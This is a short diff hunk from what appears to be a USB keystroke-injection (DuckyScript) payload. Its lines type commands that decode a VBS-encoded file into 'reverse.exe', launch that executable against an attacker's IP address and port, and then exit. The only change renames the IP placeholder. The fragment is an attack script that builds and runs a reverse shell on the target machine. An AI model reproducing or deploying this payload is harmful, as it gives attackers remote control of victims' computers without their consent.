@@ -93,7 +93,7 @@ CTRL z
 ENTER
 STRING cscript decoder.vbs reverse.txt reverse.exe
 ENTER
-STRING reverse.exe <IP> <PORT>
+STRING reverse.exe <IP_ADDR> <PORT>
 ENTER
 STRING exit
 ENTER
